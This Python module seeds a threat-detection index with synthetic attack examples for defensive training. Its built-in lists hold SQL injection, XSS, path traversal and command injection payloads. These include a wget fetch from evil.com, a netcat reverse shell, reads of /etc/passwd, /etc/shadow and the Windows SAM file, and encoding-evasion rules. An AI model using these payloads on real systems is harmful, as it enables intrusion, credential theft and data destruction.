"""
Threat Educator Module for BHSM
Pedagogical Knowledge Transfer via Structured Curricula

This module enables structured, declarative knowledge transfer to PSI
without requiring operational experience. It complements the existing
learning pathways:

| Pathway      | Source               | Learning Type   | Speed                |
|--------------|---------------------|-----------------|----------------------|
| Zero-shot    | Environment/Logs     | Statistical     | Slow (needs volume)  |
| One-shot     | Individual examples  | Experiential    | Medium (per-example) |
| Educator     | Curriculum definitions| Pedagogical    | Fast (batch)         |

The educator addresses the cold-start vulnerability by pre-warming PSI
with threat knowledge before deployment.

Usage:
    python threat_educator.py                    # Run demonstration
    python threat_educator.py --list             # List built-in curricula
    python threat_educator.py --teach sqli xss   # Teach specific curricula
    
    from threat_educator import ThreatEducator, ThreatCurriculum
    educator = ThreatEducator()
    educator.teach_builtin(psi)  # Teach all built-in curricula

(c) 2025 Shane D. Shook, PhD, All Rights Reserved
"""

import json
import random
import hashlib
import argparse
import numpy as np
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum, auto

# Import BHSM components
from BHSM import PSIIndex, get_shared_psi, l2_norm, EMBED_DIM

# =============================================================================
# Curriculum Data Structures
# =============================================================================

class ThreatCategory(Enum):
    """High-level threat taxonomy."""
    INJECTION = auto()       # SQL, command, LDAP, etc.
    XSS = auto()             # Cross-site scripting variants
    TRAVERSAL = auto()       # Path traversal, LFI/RFI
    AUTHENTICATION = auto()  # Auth bypass, brute force
    EXPOSURE = auto()        # Data exposure, information leak
    DENIAL = auto()          # DoS patterns
    MALWARE = auto()         # Malware signatures
    CUSTOM = auto()          # User-defined categories


class Severity(Enum):
    """Threat severity levels."""
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4


@dataclass
class FeatureProfile:
    """
    Statistical feature profile for a threat category.
    Defines expected ranges for the 32-dimensional embedding.
    """
    entropy_range: Tuple[float, float] = (0.0, 1.0)
    special_char_ratio: Tuple[float, float] = (0.0, 1.0)
    length_range: Tuple[float, float] = (0.0, 1.0)
    nesting_depth_range: Tuple[float, float] = (0.0, 1.0)
    repetition_range: Tuple[float, float] = (0.0, 1.0)
    
    # Optional specific feature ranges
    custom_ranges: Dict[int, Tuple[float, float]] = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        return {
            "entropy_range": self.entropy_range,
            "special_char_ratio": self.special_char_ratio,
            "length_range": self.length_range,
            "nesting_depth_range": self.nesting_depth_range,
            "repetition_range": self.repetition_range,
            "custom_ranges": self.custom_ranges
        }
    
    @classmethod
    def from_dict(cls, d: Dict) -> 'FeatureProfile':
        return cls(
            entropy_range=tuple(d.get("entropy_range", (0.0, 1.0))),
            special_char_ratio=tuple(d.get("special_char_ratio", (0.0, 1.0))),
            length_range=tuple(d.get("length_range", (0.0, 1.0))),
            nesting_depth_range=tuple(d.get("nesting_depth_range", (0.0, 1.0))),
            repetition_range=tuple(d.get("repetition_range", (0.0, 1.0))),
            custom_ranges={int(k): tuple(v) for k, v in d.get("custom_ranges", {}).items()}
        )


@dataclass
class SignaturePattern:
    """A characteristic pattern/n-gram with associated weight."""
    pattern: str
    weight: float = 0.8
    
    def to_dict(self) -> Dict:
        return {"pattern": self.pattern, "weight": self.weight}
    
    @classmethod
    def from_dict(cls, d: Dict) -> 'SignaturePattern':
        return cls(pattern=d["pattern"], weight=d.get("weight", 0.8))


@dataclass
class MutationRule:
    """Rules for generating variations of templates."""
    mutation_type: str  # "case", "encoding", "whitespace", "substitution"
    targets: List[str] = field(default_factory=list)
    variants: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "type": self.mutation_type,
            "targets": self.targets,
            "variants": self.variants
        }
    
    @classmethod
    def from_dict(cls, d: Dict) -> 'MutationRule':
        return cls(
            mutation_type=d.get("type", "case"),
            targets=d.get("targets", []),
            variants=d.get("variants", [])
        )


@dataclass
class ThreatCurriculum:
    """
    Complete curriculum definition for a threat category.
    
    The curriculum defines:
    - Name and metadata for identification
    - Feature profile for embedding characteristics
    - Signature patterns for characteristic n-grams
    - Templates for synthetic example generation
    - Mutation rules for creating variations
    """
    name: str
    category: ThreatCategory
    severity: Severity
    description: str = ""
    
    # Feature characteristics
    feature_profile: FeatureProfile = field(default_factory=FeatureProfile)
    
    # Patterns and templates
    signature_patterns: List[SignaturePattern] = field(default_factory=list)
    templates: List[str] = field(default_factory=list)
    mutations: List[MutationRule] = field(default_factory=list)
    
    # Learning parameters
    base_valence: float = 0.9  # Default positive (threat) valence
    
    def to_dict(self) -> Dict:
        return {
            "name": self.name,
            "category": self.category.name,
            "severity": self.severity.name,
            "description": self.description,
            "feature_profile": self.feature_profile.to_dict(),
            "signature_patterns": [p.to_dict() for p in self.signature_patterns],
            "templates": self.templates,
            "mutations": [m.to_dict() for m in self.mutations],
            "base_valence": self.base_valence
        }
    
    @classmethod
    def from_dict(cls, d: Dict) -> 'ThreatCurriculum':
        return cls(
            name=d["name"],
            category=ThreatCategory[d.get("category", "CUSTOM").upper()],
            severity=Severity[d.get("severity", "MEDIUM").upper()],
            description=d.get("description", ""),
            feature_profile=FeatureProfile.from_dict(d.get("feature_profile", {})),
            signature_patterns=[SignaturePattern.from_dict(p) for p in d.get("signature_patterns", [])],
            templates=d.get("templates", []),
            mutations=[MutationRule.from_dict(m) for m in d.get("mutations", [])],
            base_valence=d.get("base_valence", 0.9)
        )


@dataclass
class EducationResult:
    """Result of teaching a single curriculum."""
    curriculum_name: str
    entries_created: int
    prototype_injected: bool
    connections_formed: int
    
    
@dataclass
class EducatorStats:
    """Aggregate statistics for the educator."""
    curricula_taught: int = 0
    total_entries: int = 0
    total_connections: int = 0


# =============================================================================
# Threat Educator Implementation
# =============================================================================

class ThreatEducator:
    """
    Pedagogical knowledge transfer system for PSI.
    
    The ThreatEducator enables structured threat knowledge injection
    without requiring operational experience. It:
    
    1. Accepts curriculum definitions (declarative threat descriptions)
    2. Generates synthetic examples from templates and mutations
    3. Converts examples to 32-dimensional embeddings
    4. Injects entries into PSI with proper valence and connections
    5. Creates semantic prototypes as category anchors
    
    This addresses the cold-start vulnerability by pre-warming PSI
    with threat knowledge before deployment.
    """
    
    def __init__(self, examples_per_curriculum: int = 10):
        """
        Initialize the educator.
        
        Args:
            examples_per_curriculum: Number of synthetic examples to generate
                                     for each curriculum (default: 10)
        """
        self.examples_per_curriculum = examples_per_curriculum
        self.stats = EducatorStats()
        self.taught_curricula: List[str] = []
        
    def with_examples_per_curriculum(self, n: int) -> 'ThreatEducator':
        """Builder pattern for setting examples per curriculum."""
        self.examples_per_curriculum = n
        return self
    
    # -------------------------------------------------------------------------
    # Curriculum Loading
    # -------------------------------------------------------------------------
    
    @staticmethod
    def load_curricula_from_json(json_content: str) -> List[ThreatCurriculum]:
        """
        Load curricula from JSON content.
        
        Args:
            json_content: JSON string containing curriculum definitions
            
        Returns:
            List of ThreatCurriculum objects
        """
        data = json.loads(json_content)
        
        # Handle both single curriculum and list of curricula
        if isinstance(data, list):
            return [ThreatCurriculum.from_dict(d) for d in data]
        else:
            return [ThreatCurriculum.from_dict(data)]
    
    @staticmethod
    def load_curricula_from_file(path: str) -> List[ThreatCurriculum]:
        """Load curricula from a JSON file."""
        with open(path, 'r') as f:
            return ThreatEducator.load_curricula_from_json(f.read())
    
    # -------------------------------------------------------------------------
    # Built-in Curricula
    # -------------------------------------------------------------------------
    
    @staticmethod
    def builtin_curricula() -> List[ThreatCurriculum]:
        """
        Return built-in threat curricula.
        
        These cover common attack categories that are domain-agnostic:
        - SQL Injection
        - Cross-Site Scripting (XSS)
        - Path Traversal
        - Command Injection
        """
        return [
            ThreatEducator._sql_injection_curriculum(),
            ThreatEducator._xss_curriculum(),
            ThreatEducator._path_traversal_curriculum(),
            ThreatEducator._command_injection_curriculum(),
        ]
    
    @staticmethod
    def _sql_injection_curriculum() -> ThreatCurriculum:
        """SQL Injection curriculum."""
        return ThreatCurriculum(
            name="SQL Injection",
            category=ThreatCategory.INJECTION,
            severity=Severity.CRITICAL,
            description="SQL injection attacks attempting to manipulate database queries",
            feature_profile=FeatureProfile(
                entropy_range=(0.55, 0.80),
                special_char_ratio=(0.15, 0.40),
                length_range=(0.1, 0.6),
            ),
            signature_patterns=[
                SignaturePattern("' OR", 0.9),
                SignaturePattern("1=1", 0.85),
                SignaturePattern("UNION SELECT", 0.95),
                SignaturePattern("--", 0.7),
                SignaturePattern("DROP TABLE", 0.95),
                SignaturePattern("INSERT INTO", 0.8),
                SignaturePattern("'; DELETE", 0.9),
            ],
            templates=[
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT * FROM {table}--",
                "'; DROP TABLE {table};--",
                "' AND 1=0 UNION SELECT {columns} FROM {table}--",
                "1' ORDER BY {n}--",
                "' OR ''='",
                "admin'--",
            ],
            mutations=[
                MutationRule("case", ["OR", "SELECT", "UNION", "DROP", "TABLE", "FROM", "WHERE"]),
                MutationRule("whitespace", targets=["/**/", "+", "%20"]),
                MutationRule("encoding", variants=["url", "unicode", "hex"]),
            ],
            base_valence=0.95
        )
    
    @staticmethod
    def _xss_curriculum() -> ThreatCurriculum:
        """Cross-Site Scripting curriculum."""
        return ThreatCurriculum(
            name="Cross-Site Scripting (XSS)",
            category=ThreatCategory.XSS,
            severity=Severity.HIGH,
            description="XSS attacks injecting malicious scripts into web content",
            feature_profile=FeatureProfile(
                entropy_range=(0.50, 0.75),
                special_char_ratio=(0.20, 0.45),
                length_range=(0.1, 0.5),
            ),
            signature_patterns=[
                SignaturePattern("<script", 0.95),
                SignaturePattern("javascript:", 0.9),
                SignaturePattern("onerror=", 0.85),
                SignaturePattern("onload=", 0.85),
                SignaturePattern("alert(", 0.8),
                SignaturePattern("document.cookie", 0.9),
                SignaturePattern("eval(", 0.85),
            ],
            templates=[
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "'\"><script>alert(document.cookie)</script>",
                "<iframe src='javascript:alert(1)'>",
            ],
            mutations=[
                MutationRule("case", ["script", "alert", "onerror", "onload"]),
                MutationRule("encoding", variants=["html_entity", "url", "unicode"]),
                MutationRule("substitution", targets=["alert"], variants=["prompt", "confirm", "eval"]),
            ],
            base_valence=0.90
        )
    
    @staticmethod
    def _path_traversal_curriculum() -> ThreatCurriculum:
        """Path Traversal curriculum."""
        return ThreatCurriculum(
            name="Path Traversal",
            category=ThreatCategory.TRAVERSAL,
            severity=Severity.HIGH,
            description="Directory traversal attacks attempting to access unauthorized files",
            feature_profile=FeatureProfile(
                entropy_range=(0.40, 0.65),
                special_char_ratio=(0.25, 0.50),
                repetition_range=(0.3, 0.8),
            ),
            signature_patterns=[
                SignaturePattern("../", 0.85),
                SignaturePattern("..\\", 0.85),
                SignaturePattern("/etc/passwd", 0.95),
                SignaturePattern("..%2f", 0.9),
                SignaturePattern("....//", 0.8),
                SignaturePattern("/windows/system32", 0.9),
            ],
            templates=[
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "/var/log/../../../etc/shadow",
                "..%252f..%252f..%252fetc/passwd",
            ],
            mutations=[
                MutationRule("encoding", variants=["url", "double_url", "unicode"]),
                MutationRule("substitution", targets=["../"], variants=["..\\", "..%2f", "..%252f"]),
            ],
            base_valence=0.90
        )
    
    @staticmethod
    def _command_injection_curriculum() -> ThreatCurriculum:
        """Command Injection curriculum."""
        return ThreatCurriculum(
            name="Command Injection",
            category=ThreatCategory.INJECTION,
            severity=Severity.CRITICAL,
            description="OS command injection attacks attempting to execute system commands",
            feature_profile=FeatureProfile(
                entropy_range=(0.50, 0.75),
                special_char_ratio=(0.15, 0.40),
                length_range=(0.1, 0.5),
            ),
            signature_patterns=[
                SignaturePattern("; cat ", 0.9),
                SignaturePattern("| ls", 0.85),
                SignaturePattern("$(", 0.8),
                SignaturePattern("`", 0.7),
                SignaturePattern("&& ", 0.8),
                SignaturePattern("|| ", 0.75),
                SignaturePattern("/bin/sh", 0.9),
            ],
            templates=[
                "; cat /etc/passwd",
                "| ls -la",
                "`whoami`",
                "$(id)",
                "&& wget http://evil.com/shell.sh",
                "|| /bin/sh -c 'id'",
                "; nc -e /bin/sh {ip} {port}",
            ],
            mutations=[
                MutationRule("whitespace", targets=[" ", "\t", "${IFS}"]),
                MutationRule("substitution", targets=[";"], variants=["&&", "||", "|", "\n"]),
                MutationRule("encoding", variants=["url", "hex"]),
            ],
            base_valence=0.95
        )
    
    # -------------------------------------------------------------------------
    # Example Generation
    # -------------------------------------------------------------------------
    
    def generate_examples(self, curriculum: ThreatCurriculum, count: int) -> List[str]:
        """
        Generate synthetic examples from a curriculum.
        
        Args:
            curriculum: The curriculum to generate from
            count: Number of examples to generate
            
        Returns:
            List of synthetic example strings
        """
        examples = []
        templates = curriculum.templates or []
        
        if not templates:
            # If no templates, generate from signature patterns
            for pattern in curriculum.signature_patterns[:count]:
                examples.append(pattern.pattern)
            return examples[:count]
        
        for i in range(count):
            # Select a template
            template = random.choice(templates)
            
            # Apply mutations
            example = self._apply_mutations(template, curriculum.mutations)
            examples.append(example)
        
        return examples
    
    def _apply_mutations(self, template: str, mutations: List[MutationRule]) -> str:
        """Apply mutation rules to a template."""
        result = template
        
        for mutation in mutations:
            if random.random() < 0.5:  # 50% chance to apply each mutation
                result = self._apply_single_mutation(result, mutation)
        
        return result
    
    def _apply_single_mutation(self, text: str, mutation: MutationRule) -> str:
        """Apply a single mutation rule."""
        if mutation.mutation_type == "case":
            # Random case variation
            for target in mutation.targets:
                if target in text:
                    variations = [target.lower(), target.upper(), target.capitalize()]
                    text = text.replace(target, random.choice(variations), 1)
                    
        elif mutation.mutation_type == "whitespace":
            # Insert whitespace variations
            if mutation.targets:
                ws = random.choice(mutation.targets)
                # Insert at random position
                pos = random.randint(0, len(text))
                text = text[:pos] + ws + text[pos:]
                
        elif mutation.mutation_type == "encoding":
            # Apply encoding (simplified)
            if "url" in mutation.variants and random.random() < 0.3:
                # URL encode some characters
                text = text.replace("'", "%27").replace(" ", "%20")
                
        elif mutation.mutation_type == "substitution":
            # Substitute patterns
            for target in mutation.targets:
                if target in text and mutation.variants:
                    replacement = random.choice(mutation.variants)
                    text = text.replace(target, replacement, 1)
        
        return text
    
    # -------------------------------------------------------------------------
    # Embedding Generation
    # -------------------------------------------------------------------------
    
    def profile_to_embedding(self, profile: FeatureProfile, base_text: str = "") -> np.ndarray:
        """
        Generate a 32-dimensional embedding from a feature profile.
        
        The embedding captures the statistical characteristics defined
        in the profile, plus variation from the base text.
        """
        embedding = np.zeros(EMBED_DIM, dtype=np.float32)
        
        # Sample from profile ranges with some noise
        def sample_range(r: Tuple[float, float]) -> float:
            mid = (r[0] + r[1]) / 2
            spread = (r[1] - r[0]) / 2
            return mid + random.uniform(-spread * 0.5, spread * 0.5)
        
        # Dims 0-3: Length statistics
        embedding[0] = sample_range(profile.length_range)
        embedding[1] = random.uniform(0.1, 0.5)  # line count proxy
        embedding[2] = random.uniform(0.1, 0.4)  # avg line length
        embedding[3] = random.uniform(0.2, 0.6)  # max line length
        
        # Dims 4-7: Entropy measures
        embedding[4] = sample_range(profile.entropy_range)
        embedding[5] = sample_range(profile.entropy_range) * 0.9  # bigram entropy
        embedding[6] = random.uniform(0.3, 0.7)  # positional entropy
        embedding[7] = random.uniform(0.1, 0.4)  # entropy variance
        
        # Dims 8-15: Character distribution
        embedding[8] = random.uniform(0.2, 0.5)  # alpha ratio
        embedding[9] = random.uniform(0.05, 0.2)  # digit ratio
        embedding[10] = sample_range(profile.special_char_ratio)
        embedding[11] = random.uniform(0.05, 0.15)  # whitespace ratio
        embedding[12] = random.uniform(0.1, 0.4)  # uppercase ratio
        embedding[13] = random.uniform(0.0, 0.1)  # control char ratio
        embedding[14] = random.uniform(0.0, 0.3)  # printable ratio
        embedding[15] = random.uniform(0.0, 0.1)  # high byte ratio
        
        # Dims 16-23: Structural features
        embedding[16] = sample_range(profile.nesting_depth_range)
        embedding[17] = sample_range(profile.repetition_range)
        embedding[18] = random.uniform(0.3, 0.7)  # token diversity
        embedding[19] = random.uniform(0.1, 0.4)  # delimiter ratio
        embedding[20] = random.uniform(0.0, 0.3)  # bracket balance
        embedding[21] = random.uniform(0.0, 0.2)  # quote balance
        embedding[22] = random.uniform(0.1, 0.4)  # keyword density
        embedding[23] = random.uniform(0.0, 0.3)  # operator density
        
        # Dims 24-27: Encoding indicators
        embedding[24] = random.uniform(0.0, 0.3)  # percent encoding
        embedding[25] = random.uniform(0.0, 0.2)  # hex sequences
        embedding[26] = random.uniform(0.0, 0.1)  # base64 indicator
        embedding[27] = random.uniform(0.0, 0.1)  # non-ASCII
        
        # Dims 28-31: Derived composites
        embedding[28] = embedding[4] * embedding[10]  # entropy × special
        embedding[29] = embedding[0] * embedding[16]  # length × nesting
        embedding[30] = 0.6 + random.uniform(0.1, 0.3)  # anomaly score (high for threats)
        embedding[31] = 0.5 + random.uniform(0.1, 0.3)  # complexity
        
        # Apply custom ranges if specified
        for dim, range_val in profile.custom_ranges.items():
            if 0 <= dim < EMBED_DIM:
                embedding[dim] = sample_range(range_val)
        
        # Add text-based variation if provided
        if base_text:
            text_hash = int(hashlib.md5(base_text.encode()).hexdigest()[:8], 16)
            np.random.seed(text_hash % (2**31))
            noise = np.random.uniform(-0.05, 0.05, EMBED_DIM).astype(np.float32)
            embedding += noise
            np.random.seed(None)  # Reset seed
        
        return l2_norm(embedding)
    
    # -------------------------------------------------------------------------
    # Teaching Methods
    # -------------------------------------------------------------------------
    
    def teach(self, curriculum: ThreatCurriculum, psi: PSIIndex) -> EducationResult:
        """
        Teach a single curriculum to PSI.
        
        This method:
        1. Generates synthetic examples from templates
        2. Creates embeddings for each example
        3. Injects entries into PSI with proper valence
        4. Creates a semantic prototype as category anchor
        
        Args:
            curriculum: The curriculum to teach
            psi: The PSI instance to update
            
        Returns:
            EducationResult with statistics
        """
        entries_created = 0
        connections = 0
        
        # Generate examples
        examples = self.generate_examples(curriculum, self.examples_per_curriculum)
        
        # Create entries for each example
        for i, example in enumerate(examples):
            embedding = self.profile_to_embedding(curriculum.feature_profile, example)
            
            doc_id = f"educated_{curriculum.name.lower().replace(' ', '_')}_{i}"
            
            psi.add_doc(
                doc_id=doc_id,
                text=example,
                vec=embedding,
                tags=["educated", curriculum.category.name.lower(), curriculum.severity.name.lower()],
                valence=curriculum.base_valence * (0.9 + random.uniform(0, 0.1)),
                protected=True,  # Educated entries resist negative updates
                propagate=True   # Enable Hebbian connections
            )
            entries_created += 1
        
        # Create semantic prototype (category anchor)
        prototype_embedding = self.profile_to_embedding(curriculum.feature_profile, curriculum.name)
        prototype_id = f"prototype_{curriculum.name.lower().replace(' ', '_')}"
        
        psi.add_doc(
            doc_id=prototype_id,
            text=f"[PROTOTYPE] {curriculum.name}: {curriculum.description}",
            vec=prototype_embedding,
            tags=["educated", "prototype", curriculum.category.name.lower()],
            valence=curriculum.base_valence,
            protected=True,
            propagate=True
        )
        entries_created += 1
        
        # Update stats
        self.stats.curricula_taught += 1
        self.stats.total_entries += entries_created
        self.taught_curricula.append(curriculum.name)
        
        return EducationResult(
            curriculum_name=curriculum.name,
            entries_created=entries_created,
            prototype_injected=True,
            connections_formed=connections
        )
    
    def teach_all(self, curricula: List[ThreatCurriculum], psi: PSIIndex) -> List[EducationResult]:
        """
        Teach multiple curricula to PSI.
        
        Args:
            curricula: List of curricula to teach
            psi: The PSI instance to update
            
        Returns:
            List of EducationResult for each curriculum
        """
        results = []
        for curriculum in curricula:
            result = self.teach(curriculum, psi)
            results.append(result)
        return results
    
    def teach_builtin(self, psi: PSIIndex) -> List[EducationResult]:
        """
        Teach all built-in curricula to PSI.
        
        Args:
            psi: The PSI instance to update
            
        Returns:
            List of EducationResult for each curriculum
        """
        return self.teach_all(self.builtin_curricula(), psi)
    
    # -------------------------------------------------------------------------
    # Utility Methods
    # -------------------------------------------------------------------------
    
    def get_stats(self) -> EducatorStats:
        """Return aggregate statistics."""
        return self.stats
    
    def get_taught_curricula(self) -> List[str]:
        """Return list of taught curriculum names."""
        return self.taught_curricula.copy()
    
    def is_taught(self, curriculum_name: str) -> bool:
        """Check if a curriculum has been taught."""
        return curriculum_name in self.taught_curricula
    
    @staticmethod
    def list_builtin() -> List[str]:
        """List names of built-in curricula."""
        return [c.name for c in ThreatEducator.builtin_curricula()]


# =============================================================================
# CLI Interface
# =============================================================================

def run_demonstration():
    """Run a demonstration of the ThreatEducator."""
    print("=" * 60)
    print("BHSM Threat Educator - Demonstration")
    print("=" * 60)
    print()
    
    # Create PSI and educator
    psi = PSIIndex()
    educator = ThreatEducator(examples_per_curriculum=10)
    
    print("Teaching built-in curricula to PSI...")
    print("-" * 40)
    
    results = educator.teach_builtin(psi)
    
    for result in results:
        print(f"  ✓ {result.curriculum_name}")
        print(f"    Entries created: {result.entries_created}")
        print(f"    Prototype injected: {result.prototype_injected}")
    
    print()
    print("-" * 40)
    print(f"Education Complete!")
    print(f"  Curricula taught: {educator.stats.curricula_taught}")
    print(f"  Total PSI entries: {len(psi.docs)}")
    
    # Test classification with educated PSI
    print()
    print("Testing classification with educated PSI...")
    print("-" * 40)
    
    # Generate test embeddings
    test_cases = [
        ("SQL Injection", "' OR '1'='1--"),
        ("XSS", "<script>alert('XSS')</script>"),
        ("Path Traversal", "../../../etc/passwd"),
        ("Benign", "SELECT name FROM users WHERE id=123"),
    ]
    
    for label, example in test_cases:
        # Create embedding for test
        test_embedding = educator.profile_to_embedding(
            FeatureProfile(entropy_range=(0.5, 0.7), special_char_ratio=(0.1, 0.3)),
            example
        )
        
        # Search PSI
        results = psi.search(test_embedding, top_k=3)
        avg_valence = psi.compute_valence_weighted_average(test_embedding, top_k=3)
        
        print(f"\n  Test: {label}")
        print(f"    Input: {example[:40]}...")
        print(f"    Avg valence: {avg_valence:.3f}")
        print(f"    Top matches:")
        for sim, doc_id, entry in results[:2]:
            print(f"      - {doc_id}: sim={sim:.3f}, valence={entry['valence']:.2f}")
    
    print()
    print("=" * 60)
    print("Demonstration complete!")


def main():
    """Main entry point with CLI argument handling."""
    parser = argparse.ArgumentParser(
        description="BHSM Threat Educator - Pedagogical Knowledge Transfer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python threat_educator.py                    # Run demonstration
  python threat_educator.py --list             # List built-in curricula
  python threat_educator.py --teach sqli xss   # Teach specific curricula
  python threat_educator.py --file custom.json # Load custom curricula
        """
    )
    
    parser.add_argument('--list', action='store_true',
                       help='List built-in curricula')
    parser.add_argument('--teach', nargs='+', metavar='NAME',
                       help='Teach specific curricula by name (partial match)')
    parser.add_argument('--file', type=str, metavar='PATH',
                       help='Load custom curricula from JSON file')
    parser.add_argument('--examples', type=int, default=10,
                       help='Examples per curriculum (default: 10)')
    
    args = parser.parse_args()
    
    if args.list:
        print("Built-in Curricula:")
        print("-" * 40)
        for curriculum in ThreatEducator.builtin_curricula():
            print(f"  • {curriculum.name}")
            print(f"    Category: {curriculum.category.name}")
            print(f"    Severity: {curriculum.severity.name}")
            print(f"    Description: {curriculum.description[:60]}...")
            print()
    elif args.teach:
        # Teach specific curricula
        psi = get_shared_psi()
        educator = ThreatEducator(examples_per_curriculum=args.examples)
        
        all_curricula = ThreatEducator.builtin_curricula()
        
        for name in args.teach:
            matching = [c for c in all_curricula if name.lower() in c.name.lower()]
            if matching:
                for curriculum in matching:
                    result = educator.teach(curriculum, psi)
                    print(f"✓ Taught {result.curriculum_name}: {result.entries_created} entries")
            else:
                print(f"✗ No curriculum matching '{name}'")
        
        print(f"\nPSI now contains {len(psi.docs)} entries")
    elif args.file:
        # Load and teach custom curricula
        psi = get_shared_psi()
        educator = ThreatEducator(examples_per_curriculum=args.examples)
        
        try:
            curricula = ThreatEducator.load_curricula_from_file(args.file)
            results = educator.teach_all(curricula, psi)
            
            for result in results:
                print(f"✓ Taught {result.curriculum_name}: {result.entries_created} entries")
            
            print(f"\nPSI now contains {len(psi.docs)} entries")
        except Exception as e:
            print(f"Error loading curricula: {e}")
    else:
        run_demonstration()


if __name__ == "__main__":
    main()
